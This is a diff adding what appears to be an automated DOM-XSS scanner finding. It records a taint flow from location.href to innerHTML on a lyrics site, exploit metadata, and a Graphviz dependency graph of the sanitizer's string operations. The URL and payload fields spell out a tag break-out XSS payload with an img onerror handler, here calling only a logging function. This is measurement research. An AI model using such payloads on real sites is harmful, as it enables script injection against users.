@@ -1,0 +1,106 @@
+// Finding: 85fc0b6b-1cef-4f9c-aadd-ceb8abe09ccb
+// Finding.url: https://example446.com/the-offspring-we-never-have-sex-anymore-lyrics/
+// Finding.parentloc: https://example446.com/the-offspring-we-never-have-sex-anymore-lyrics/##'></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('8155162b7ba14d548fdf67d4fd4197bb')><!--/*
+// Finding.domain: example446.com
+// Finding.base_domain: example446.com
+// Finding.source: location.href
+// Finding.sink: innerHTML
+// Sanitizer.score: 1
+// Sanitizer.name: SekindoClientDetections_URL/this.setInfo
+// Sanitizer.location: https://live.example5.com/live/liveView.php?s=103965&cbuster=1198578699&pubUrl=https://example446.com/the-offspring-we-never-have-sex-anymore-lyrics/%23%23%27%3E%3C/iframe%3E%3C/style%3E%3C/script%3E%3C/object%3E%3C/embed%3E%3C/textarea%3E%3Cimg+src%3Dx+onerror%3DtaintfoxLog(%278155162b7ba14d548fdf67d4fd4197bb%27)%3E%3C!--/*&subId=[SUBID_ENCODED] - SekindoClientDetections_URL/this.setInfo:621:7
+// Finding.begin: 389
+// Finding.end: 473
+// Finding.original_uuid: 72f1f4e1-8de0-4a3e-b7be-b47ab7872ca2
+// Finding.TwentyFiveMillionFlowsId: 892111063
+// Finding.script: https://example447.com./script.js line 1 > eval
+// Finding.line: 1
+// Exploit.uuid: 8155162b-7ba1-4d54-8fdf-67d4fd4197bb
+// Exploit.success: false
+// Exploit.status: validated
+// Exploit.method: C
+// Exploit.type: html
+// Exploit.token: attribute
+// Exploit.content: src
+// Exploit.quote_type: '
+// Exploit.tag: script
+// Exploit.break_out: #'></iframe></style></script></object></embed></textarea><img src=x onerror=
+// Exploit.break_in: ><!--/*
+// Exploit.payload: #'></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog(1)><!--/*
+// Exploit.begin_taint_url: 0
+// Exploit.end_taint_url: 68
+// Exploit.replace_begin_url: 68
+// Exploit.replace_end_url: 68
+// Exploit.replace_begin_param: 290
+// Exploit.replace_end_param: 290
+// Issues.LargestEncodeAttrStringChain: 0
+// Issues.LargestTextFragmentEncodeChainLength: 0
+// Issues.HasApproximation: false
+// Issues.HasMissingImplementation: false
+// Issues.HasInfiniteRegexWithFunctionReplacer: false
+// Issues.MergedSplitAndJoins: false
+// Issues.HasUrlInRhsOfReplace: false
+// Issues.HasUrlInLhsOfReplace: false
+// Issues.HasCookieValueInLhsOfreplace: false
+// Issues.HasCookieValueInRhsOfreplace: false
+// Issues.HasCookieValueInMatchPattern: false
+// Issues.HasCookieValueInExecPattern: false
+// Issues.RemovedLRConcats: false
+// Issues.RemovedReplaceArtifacts: false
+// Issues.HasUrlInMatchPattern: false
+// Issues.HasUrlInExecPattern: false
+// Issues.RemovedNOPreplaces: false
+// Issues.Known_sanitizer: false
+// DepGraph.hash: 202604446
+// DepGraph.sanitizer_hash: 351419521
+
+digraph cfg {
+n0 [shape=house, label="Input: x"];
+n1 [shape=ellipse, label="encodeURIComponent"];
+n2 [shape=box, label="Var: x"];
+n3 [shape=ellipse, label="."];
+n4 [shape=box, label="Lit: &pubUrlAuto="];
+n5 [shape=ellipse, label="."];
+n6 [shape=box, label="Lit: https://live.example5.com/live/liveView.php?s=103965&cbuster=11....4197bb%27)%3E%3C!--/*&subId=[SUBID_ENCODED]&cbuster=1621056073"];
+n7 [shape=ellipse, label="str_replace_once"];
+n8 [shape=box, label="Lit: SEKXLEN"];
+n9 [shape=box, label="Lit: 550"];
+n10 [shape=box, label="Var: x"];
+n11 [shape=ellipse, label="str_replace_once"];
+n12 [shape=box, label="Lit: SEKYLEN"];
+n13 [shape=box, label="Lit: 309"];
+n14 [shape=box, label="Var: x"];
+n15 [shape=ellipse, label="str_replace_once"];
+n16 [shape=box, label="Lit: '"];
+n17 [shape=box, label="Lit: %27"];
+n18 [shape=box, label="Var: x"];
+n19 [shape=ellipse, label="."];
+n20 [shape=box, label="Lit: &csuuid=609f5a48f02ed"];
+n21 [shape=ellipse, label="."];
+n22 [shape=box, label="Lit: &videoType=flow&floatWidth=400&floatHeight=225&floatDirection=....loatCloseBtn=1&flowMode=seenboth&flowCloseButtonPosition=right"];
+n23 [shape=box, label="Var: x"];
+n24 [shape=doubleoctagon, label="Return: x"];
+n2 -> n0;
+n1 -> n2;
+n3 -> n4;
+n3 -> n1;
+n5 -> n6;
+n5 -> n3;
+n10 -> n5;
+n7 -> n8;
+n7 -> n9;
+n7 -> n10;
+n14 -> n7;
+n11 -> n12;
+n11 -> n13;
+n11 -> n14;
+n18 -> n11;
+n15 -> n16;
+n15 -> n17;
+n15 -> n18;
+n19 -> n15;
+n19 -> n20;
+n21 -> n19;
+n21 -> n22;
+n23 -> n21;
+n24 -> n23;
+}
